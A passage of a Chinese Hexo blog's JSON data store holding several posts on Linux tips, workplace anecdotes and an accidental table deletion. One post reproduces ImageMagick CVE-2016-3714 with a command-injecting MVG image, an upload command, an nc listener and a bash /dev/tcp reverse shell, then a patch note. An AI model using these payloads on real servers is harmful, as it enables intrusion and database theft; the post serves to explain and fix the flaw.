title=\"能用centos吗？\"></a>能用centos吗？</h3><p>现在可以了，centos7有arm树莓派版。下载地址：</p>\n<blockquote>\n<p><a href=\"http://mirror.centos.org/altarch/7/isos/armhfp/CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz\" target=\"_blank\" rel=\"noopener\">CentOS-Userland-7-armv7hl-Minimal-1511-RaspberryPi2.img.xz</a></p>\n</blockquote>\n<p>启动盘制作方法有很多参考资料，win10下面我用的Win32DiskImager，和烧录其它img没有区别。<br>注意启动树莓派后，不需要显示器界面来设置密码。直接SSH用户名<code>root</code>，密码<code>centos</code>即可登录，参见：</p>\n<blockquote>\n<p><a href=\"https://www.anyran.com/2015/12/21818.html\" target=\"_blank\" rel=\"noopener\">CentOS 7 for ARM 初体验</a></p>\n</blockquote>\n<h3 id=\"编译遇到的问题\"><a href=\"#编译遇到的问题\" class=\"headerlink\" title=\"编译遇到的问题\"></a>编译遇到的问题</h3><p>用yum安装<code>libxml2</code>时，提示缺少<code>xz-devel</code>，但是yum仓库里没有<code>xz-devel.armv7hl</code></p>\n<pre><code>$ sudo yum install libxml2-devel\n---&amp;gt; Package libxml2-devel.armv7hl 0:2.9.1-6.el7.2 will be installed\n--&amp;gt; Processing Dependency: xz-devel for package: libxml2-devel-2.9.1-6.el7.2.armv7hl\n--&amp;gt; Finished Dependency Resolution\nError: Package: libxml2-devel-2.9.1-6.el7.2.armv7hl (updates)\n           Requires: xz-devel\n\n$ sudo yum install xz-devel\nNo package xz-devel available.\n`&lt;/pre&gt;\n\n`xz-devel`目前只在官方dev仓库里有：http://armv7.dev.centos.org/repodir/c7-buildroot/xz/\n\n&lt;pre&gt;`sudo rpm -i &quot;http://armv7.dev.centos.org/repodir/c7-buildroot/xz/xz-devel-5.1.2-9alpha.el7.armv7hl.rpm&quot;\n</code></pre><p>所以单独从RPM文件安装<code>xz-devel</code>，之后，就能顺利编译PHP的libxml2模块。</p>\n"},{"title":"linux下载文件加速方法","id":"278","date":"2016-01-24T11:31:01.000Z","_content":"\n有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。\n\n下面是我整理了一些加速的方法：\n\n## nginx搭建正向代理服务器\n\n首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。\n\n这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。\n\n配置规则：\n\n    server {\n        listen    80;\n        server_name ~^(?&lt;domain&gt;.+)\\.proxy.xiaoai.me$;\n\n        location / {\n            resolver 8.8.8.8;\n            proxy_pass $scheme://$domain;\n            proxy_set_header Host $domain;\n            proxy_pass_request_headers      on;\n        }\n    }\n    `</pre>\n\n    比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n    这时候可以给链接加个正向代理的域名： https://nodejs.org**.proxy.xiaoai.me**/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n    ## proxychains 命令行设置代理\n\n    有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n    <pre>`$ proxychains composer update\n\nproxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。\n\n## Axel 多线程下载\n\naxel是一个命令行下的工具。比起`wget`，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性`Range: bytes=1024-2048`实现了加速下载。","source":"_posts/linux-e4-b8-8b-e8-bd-bd-e6-96-87-e4-bb-b6-e5-8a-a0-e9-80-9f-e6-96-b9-e6-b3-95.md","raw":"---\ntitle: linux下载文件加速方法\nid: 278\ncategories:\n  - linux\ndate: 2016-01-24 19:31:01\ntags:\n---\n\n有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。\n\n下面是我整理了一些加速的方法：\n\n## nginx搭建正向代理服务器\n\n首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。\n\n这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。\n\n配置规则：\n\n    server {\n        listen    80;\n        server_name ~^(?&lt;domain&gt;.+)\\.proxy.xiaoai.me$;\n\n        location / {\n            resolver 8.8.8.8;\n            proxy_pass $scheme://$domain;\n            proxy_set_header Host $domain;\n            proxy_pass_request_headers      on;\n        }\n    }\n    `</pre>\n\n    比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n    这时候可以给链接加个正向代理的域名： https://nodejs.org**.proxy.xiaoai.me**/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n    ## proxychains 命令行设置代理\n\n    有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n    <pre>`$ proxychains composer update\n\nproxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。\n\n## Axel 多线程下载\n\naxel是一个命令行下的工具。比起`wget`，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性`Range: bytes=1024-2048`实现了加速下载。","slug":"linux-e4-b8-8b-e8-bd-bd-e6-96-87-e4-bb-b6-e5-8a-a0-e9-80-9f-e6-96-b9-e6-b3-95","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimm00hegmlmrtjpmwjx","content":"<p>有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。</p>\n<p>下面是我整理了一些加速的方法：</p>\n<h2 id=\"nginx搭建正向代理服务器\"><a href=\"#nginx搭建正向代理服务器\" class=\"headerlink\" title=\"nginx搭建正向代理服务器\"></a>nginx搭建正向代理服务器</h2><p>首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。</p>\n<p>这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。</p>\n<p>配置规则：</p>\n<pre><code>server {\n    listen    80;\n    server_name ~^(?&amp;lt;domain&amp;gt;.+)\\.proxy.xiaoai.me$;\n\n    location / {\n        resolver 8.8.8.8;\n        proxy_pass $scheme://$domain;\n        proxy_set_header Host $domain;\n        proxy_pass_request_headers      on;\n    }\n}\n`&lt;/pre&gt;\n\n比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n这时候可以给链接加个正向代理的域名： https://nodejs.org**.proxy.xiaoai.me**/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n## proxychains 命令行设置代理\n\n有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n&lt;pre&gt;`$ proxychains composer update\n</code></pre><p>proxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。</p>\n<h2 id=\"Axel-多线程下载\"><a href=\"#Axel-多线程下载\" class=\"headerlink\" title=\"Axel 多线程下载\"></a>Axel 多线程下载</h2><p>axel是一个命令行下的工具。比起<code>wget</code>，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性<code>Range: bytes=1024-2048</code>实现了加速下载。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。</p>\n<p>下面是我整理了一些加速的方法：</p>\n<h2 id=\"nginx搭建正向代理服务器\"><a href=\"#nginx搭建正向代理服务器\" class=\"headerlink\" title=\"nginx搭建正向代理服务器\"></a>nginx搭建正向代理服务器</h2><p>首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。</p>\n<p>这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。</p>\n<p>配置规则：</p>\n<pre><code>server {\n    listen    80;\n    server_name ~^(?&amp;lt;domain&amp;gt;.+)\\.proxy.xiaoai.me$;\n\n    location / {\n        resolver 8.8.8.8;\n        proxy_pass $scheme://$domain;\n        proxy_set_header Host $domain;\n        proxy_pass_request_headers      on;\n    }\n}\n`&lt;/pre&gt;\n\n比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n这时候可以给链接加个正向代理的域名： https://nodejs.org**.proxy.xiaoai.me**/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n## proxychains 命令行设置代理\n\n有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n&lt;pre&gt;`$ proxychains composer update\n</code></pre><p>proxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。</p>\n<h2 id=\"Axel-多线程下载\"><a href=\"#Axel-多线程下载\" class=\"headerlink\" title=\"Axel 多线程下载\"></a>Axel 多线程下载</h2><p>axel是一个命令行下的工具。比起<code>wget</code>，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性<code>Range: bytes=1024-2048</code>实现了加速下载。</p>\n"},{"title":"朋友圈","id":"285","date":"2016-01-31T15:09:38.000Z","_content":"\n昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。\n今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。\n\n--- 流水账日志","source":"_posts/e6-9c-8b-e5-8f-8b-e5-9c-88.md","raw":"---\ntitle: 朋友圈\nid: 285\ncategories:\n  - 经历\ndate: 2016-01-31 23:09:38\ntags:\n---\n\n昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。\n今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。\n\n--- 流水账日志","slug":"e6-9c-8b-e5-8f-8b-e5-9c-88","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimo00hggmlm94j5t4qi","content":"<p>昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。<br>今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。</p>\n<p>— 流水账日志</p>\n","site":{"data":{}},"excerpt":"","more":"<p>昨天给老板的朋友圈点了个赞，结果老板把我屏蔽了，很失落。<br>今天一位女神同事突然开放了我朋友圈，又非常高兴，顺手点了个赞。</p>\n<p>— 流水账日志</p>\n"},{"title":"自己重要还是公司重要","id":"192","date":"2015-11-07T15:50:25.000Z","_content":"\n前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。\n\n我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。\n\n老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。\n\n当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。","source":"_posts/e8-87-aa-e5-b7-b1-e9-87-8d-e8-a6-81-e8-bf-98-e6-98-af-e5-85-ac-e5-8f-b8-e9-87-8d-e8-a6-81.md","raw":"---\ntitle: 自己重要还是公司重要\nid: 192\ncategories:\n  - 经历\ndate: 2015-11-07 23:50:25\ntags:\n---\n\n前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。\n\n我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。\n\n老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。\n\n当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。","slug":"e8-87-aa-e5-b7-b1-e9-87-8d-e8-a6-81-e8-bf-98-e6-98-af-e5-85-ac-e5-8f-b8-e9-87-8d-e8-a6-81","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimp00higmlmdgratbrf","content":"<p>前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。</p>\n<p>我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。</p>\n<p>老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。</p>\n<p>当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前两天和技术老大有些意见相左，老大想把网站的用户，订单，从查询数据库变成用调用C++写的独立服务。</p>\n<p>我反对这种做法，因为完全是大炮打蚊子，多花时间而且效果还不好。现在网站有些模块已经是C++写的服务，调试和部署都很麻烦。而且这个C++服务没有用数据库，很多时间都用来重复造轮子，这样的架构并不适合小规模网站。</p>\n<p>老大的意见也很明确，这的确是门户级别才有的架构。我们的网站规模小，就算把目前的LNMP玩的烂熟对自己又有什么用？换句话说你永远只能拿那点工资。学习新东西不是更好，这样将来也可以真的去写门户。</p>\n<p>当然我只能接受，但我还是觉得拿着老板的钱还是老老实实把活做漂亮吧，新东西自己用业余时间学习也行。</p>\n"},{"title":"fedora23关掉gnome弹窗","id":"289","date":"2016-02-05T05:07:35.000Z","_content":"\n我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。\n\n经过对进程排查，弹窗的进程文件是 `/usr/libexec/gnome-shell-portal-helper`，所以只要删除这个执行文件就可以屏蔽了。","source":"_posts/fedora23-e5-85-b3-e6-8e-89gnome-e5-bc-b9-e7-aa-97.md","raw":"---\ntitle: fedora23关掉gnome弹窗\nid: 289\ncategories:\n  - linux\ndate: 2016-02-05 13:07:35\ntags:\n---\n\n我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。\n\n经过对进程排查，弹窗的进程文件是 `/usr/libexec/gnome-shell-portal-helper`，所以只要删除这个执行文件就可以屏蔽了。","slug":"fedora23-e5-85-b3-e6-8e-89gnome-e5-bc-b9-e7-aa-97","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimr00hkgmlmw4b2r6hn","content":"<p>我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。</p>\n<p>经过对进程排查，弹窗的进程文件是 <code>/usr/libexec/gnome-shell-portal-helper</code>，所以只要删除这个执行文件就可以屏蔽了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我用的桌面是最新的fedora23，它有时候会莫名其妙的弹出gnome的网页弹窗。</p>\n<p>经过对进程排查，弹窗的进程文件是 <code>/usr/libexec/gnome-shell-portal-helper</code>，所以只要删除这个执行文件就可以屏蔽了。</p>\n"},{"title":"误删线上的表","id":"294","date":"2016-03-08T06:49:26.000Z","_content":"\n刚才在从线上表里删除产品时，不小心删除了整个表。也就是`where`条件没写上。\n\n因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。\n\n    delete from product where id ;\n\n结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了`Enter`键。\n\n幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。\n\n这是最严重的错误，以后绝对不能用SQL直接删除数据。","source":"_posts/e8-af-af-e5-88-a0-e7-ba-bf-e4-b8-8a-e7-9a-84-e8-a1-a8.md","raw":"---\ntitle: 误删线上的表\nid: 294\ncategories:\n  - php\ndate: 2016-03-08 14:49:26\ntags:\n---\n\n刚才在从线上表里删除产品时，不小心删除了整个表。也就是`where`条件没写上。\n\n因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。\n\n    delete from product where id ;\n\n结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了`Enter`键。\n\n幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。\n\n这是最严重的错误，以后绝对不能用SQL直接删除数据。","slug":"e8-af-af-e5-88-a0-e7-ba-bf-e4-b8-8a-e7-9a-84-e8-a1-a8","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cims00hmgmlm96dgzc20","content":"<p>刚才在从线上表里删除产品时，不小心删除了整个表。也就是<code>where</code>条件没写上。</p>\n<p>因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。</p>\n<pre><code>delete from product where id ;\n</code></pre><p>结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了<code>Enter</code>键。</p>\n<p>幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。</p>\n<p>这是最严重的错误，以后绝对不能用SQL直接删除数据。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>刚才在从线上表里删除产品时，不小心删除了整个表。也就是<code>where</code>条件没写上。</p>\n<p>因为是分几次删除，所以先把上次删除的命令调出来，然后修改后面的ID参数。</p>\n<pre><code>delete from product where id ;\n</code></pre><p>结果刚删掉老的参数，同事问我问题，我手就自然落在键盘上，触发了<code>Enter</code>键。</p>\n<p>幸好昨天晚上还备份过，所以用了两三分钟，将产品数据恢复过来了，不过服务因此也中断了几分钟。</p>\n<p>这是最严重的错误，以后绝对不能用SQL直接删除数据。</p>\n"},{"title":"ImageMagick远程命令执行漏洞","id":"297","date":"2016-05-19T15:26:42.000Z","_content":"\n最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：\n\n> [CVE-2016-3714 - ImageMagick 命令执行分析](http://drops.wooyun.org/papers/15589)\n>   [安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)](http://www.freebuf.com/vuls/103504.html)\n\n## 漏洞重现\n\n1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为`test.gif`：\n\n    push graphic-context\n    viewbox 0 0 640 480\n    fill 'url(https://\"|curl http://127.0.0.1/hasbug; \")'\n    pop graphic-context\n    `</pre>\n\n    第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n    2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n    <pre>`&lt;?php\n    new Imagick($_FILES['file']['tmp_name']);\n    `</pre>\n\n    3 在有漏洞的网站触发此执行漏洞：\n\n    <pre>`$ curl -F \"file=@test.gif\" \"http://localhost/test.php\"\n    `</pre>\n\n    现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n    ## 漏洞影响\n\n    上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n    1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n    <pre>`$ nc -l 127.0.0.1:1234 -vvv\n    `</pre>\n\n    2 要注入的反向shell命令，替换`curl`的试探命令：\n\n    <pre>`bash -i &gt; /dev/tcp/127.0.0.1/1234 0&lt;&amp;1 2&gt;&amp;1\n\n反向shell的作用是请求上面`nc`命令监听的`127.0.0.1:1234`，并且执行`nc`后续输入的远程命令。\n\n> [Linux建立反向shell的几种方式](http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/)\n\n3 由于服务器执行PHP的用户默认是`nobody`，对web目录一般都没有写权限。那么能干什么呢？\n\n1.  查看程序源代码\n2.  获得mysql数据库的访问权限\n3.  执行mysqldump等数据导出命令\n\n这个漏洞的主要的危害是数据泄漏。\n\n据传 http://nulled.io/ 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。\n\n> [国外知名黑客论坛被黑，疑因imageTragick漏洞](http://www.freebuf.com/news/104757.html)\n\n## 漏洞修复\n\n这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用`getimagesize()`先对上传文件检验一下。\n\n详细方法见开头的分析链接。","source":"_posts/e8-bf-9c-e7-a8-8b-e5-91-bd-e4-bb-a4-e6-89-a7-e8-a1-8c-e6-96-b0-e6-8a-80-e5-b7-a7.md","raw":"---\ntitle: ImageMagick远程命令执行漏洞\nid: 297\ncategories:\n  - linux\n  - php\ndate: 2016-05-19 23:26:42\ntags:\n---\n\n最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：\n\n> [CVE-2016-3714 - ImageMagick 命令执行分析](http://drops.wooyun.org/papers/15589)\n>   [安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)](http://www.freebuf.com/vuls/103504.html)\n\n## 漏洞重现\n\n1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为`test.gif`：\n\n    push graphic-context\n    viewbox 0 0 640 480\n    fill 'url(https://\"|curl http://127.0.0.1/hasbug; \")'\n    pop graphic-context\n    `</pre>\n\n    第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n    2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n    <pre>`&lt;?php\n    new Imagick($_FILES['file']['tmp_name']);\n    `</pre>\n\n    3 在有漏洞的网站触发此执行漏洞：\n\n    <pre>`$ curl -F \"file=@test.gif\" \"http://localhost/test.php\"\n    `</pre>\n\n    现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n    ## 漏洞影响\n\n    上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n    1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n    <pre>`$ nc -l 127.0.0.1:1234 -vvv\n    `</pre>\n\n    2 要注入的反向shell命令，替换`curl`的试探命令：\n\n    <pre>`bash -i &gt; /dev/tcp/127.0.0.1/1234 0&lt;&amp;1 2&gt;&amp;1\n\n反向shell的作用是请求上面`nc`命令监听的`127.0.0.1:1234`，并且执行`nc`后续输入的远程命令。\n\n> [Linux建立反向shell的几种方式](http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/)\n\n3 由于服务器执行PHP的用户默认是`nobody`，对web目录一般都没有写权限。那么能干什么呢？\n\n1.  查看程序源代码\n2.  获得mysql数据库的访问权限\n3.  执行mysqldump等数据导出命令\n\n这个漏洞的主要的危害是数据泄漏。\n\n据传 http://nulled.io/ 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。\n\n> [国外知名黑客论坛被黑，疑因imageTragick漏洞](http://www.freebuf.com/news/104757.html)\n\n## 漏洞修复\n\n这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用`getimagesize()`先对上传文件检验一下。\n\n详细方法见开头的分析链接。","slug":"e8-bf-9c-e7-a8-8b-e5-91-bd-e4-bb-a4-e6-89-a7-e8-a1-8c-e6-96-b0-e6-8a-80-e5-b7-a7","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimt00hogmlmedsp9uw5","content":"<p>最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：</p>\n<blockquote>\n<p><a href=\"http://drops.wooyun.org/papers/15589\" target=\"_blank\" rel=\"noopener\">CVE-2016-3714 - ImageMagick 命令执行分析</a><br>  <a href=\"http://www.freebuf.com/vuls/103504.html\" target=\"_blank\" rel=\"noopener\">安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)</a></p>\n</blockquote>\n<h2 id=\"漏洞重现\"><a href=\"#漏洞重现\" class=\"headerlink\" title=\"漏洞重现\"></a>漏洞重现</h2><p>1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为<code>test.gif</code>：</p>\n<pre><code>push graphic-context\nviewbox 0 0 640 480\nfill &apos;url(https://&quot;|curl http://127.0.0.1/hasbug; &quot;)&apos;\npop graphic-context\n`&lt;/pre&gt;\n\n第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n&lt;pre&gt;`&amp;lt;?php\nnew Imagick($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);\n`&lt;/pre&gt;\n\n3 在有漏洞的网站触发此执行漏洞：\n\n&lt;pre&gt;`$ curl -F &quot;file=@test.gif&quot; &quot;http://localhost/test.php&quot;\n`&lt;/pre&gt;\n\n现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n## 漏洞影响\n\n上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n&lt;pre&gt;`$ nc -l 127.0.0.1:1234 -vvv\n`&lt;/pre&gt;\n\n2 要注入的反向shell命令，替换`curl`的试探命令：\n\n&lt;pre&gt;`bash -i &amp;gt; /dev/tcp/127.0.0.1/1234 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1\n</code></pre><p>反向shell的作用是请求上面<code>nc</code>命令监听的<code>127.0.0.1:1234</code>，并且执行<code>nc</code>后续输入的远程命令。</p>\n<blockquote>\n<p><a href=\"http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/\" target=\"_blank\" rel=\"noopener\">Linux建立反向shell的几种方式</a></p>\n</blockquote>\n<p>3 由于服务器执行PHP的用户默认是<code>nobody</code>，对web目录一般都没有写权限。那么能干什么呢？</p>\n<ol>\n<li>查看程序源代码</li>\n<li>获得mysql数据库的访问权限</li>\n<li>执行mysqldump等数据导出命令</li>\n</ol>\n<p>这个漏洞的主要的危害是数据泄漏。</p>\n<p>据传 <a href=\"http://nulled.io/\" target=\"_blank\" rel=\"noopener\">http://nulled.io/</a> 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/news/104757.html\" target=\"_blank\" rel=\"noopener\">国外知名黑客论坛被黑，疑因imageTragick漏洞</a></p>\n</blockquote>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用<code>getimagesize()</code>先对上传文件检验一下。</p>\n<p>详细方法见开头的分析链接。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近ImageMagick爆出了命令执行漏洞，此漏洞允许攻击者通过上传恶意构造的图像文件，在目标服务器执行任意代码。参见中文版说明：</p>\n<blockquote>\n<p><a href=\"http://drops.wooyun.org/papers/15589\" target=\"_blank\" rel=\"noopener\">CVE-2016-3714 - ImageMagick 命令执行分析</a><br>  <a href=\"http://www.freebuf.com/vuls/103504.html\" target=\"_blank\" rel=\"noopener\">安全预警：ImageMagick图象处理软件存在远程代码执行(CVE-2016-3714)</a></p>\n</blockquote>\n<h2 id=\"漏洞重现\"><a href=\"#漏洞重现\" class=\"headerlink\" title=\"漏洞重现\"></a>漏洞重现</h2><p>1 先构造一个.mvg格式的图片，在其内容中可以注入任意命令。这里命名为<code>test.gif</code>：</p>\n<pre><code>push graphic-context\nviewbox 0 0 640 480\nfill &apos;url(https://&quot;|curl http://127.0.0.1/hasbug; &quot;)&apos;\npop graphic-context\n`&lt;/pre&gt;\n\n第三行就是注入的命令，用双引号作为注入分隔。后面的`curl http://127.0.0.1/hasbug;`就是可执行的命令。\n\n2 测试漏洞的脚本`http://localhost/test.php`，只需要一行代码：\n\n&lt;pre&gt;`&amp;lt;?php\nnew Imagick($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);\n`&lt;/pre&gt;\n\n3 在有漏洞的网站触发此执行漏洞：\n\n&lt;pre&gt;`$ curl -F &quot;file=@test.gif&quot; &quot;http://localhost/test.php&quot;\n`&lt;/pre&gt;\n\n现在目标服务器就会执行注入的命令 `curl http://127.0.0.1/hasbug;`\n\n## 漏洞影响\n\n上面注入的脚本`curl`只是试探一下，我们可以通过反向shell的技巧执行任意命令。\n\n1 在执行前，需要在自己的服务器上建立命令执行平台：\n\n&lt;pre&gt;`$ nc -l 127.0.0.1:1234 -vvv\n`&lt;/pre&gt;\n\n2 要注入的反向shell命令，替换`curl`的试探命令：\n\n&lt;pre&gt;`bash -i &amp;gt; /dev/tcp/127.0.0.1/1234 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1\n</code></pre><p>反向shell的作用是请求上面<code>nc</code>命令监听的<code>127.0.0.1:1234</code>，并且执行<code>nc</code>后续输入的远程命令。</p>\n<blockquote>\n<p><a href=\"http://xkon.github.io/2015/09/04/Linux%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%90%91shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/\" 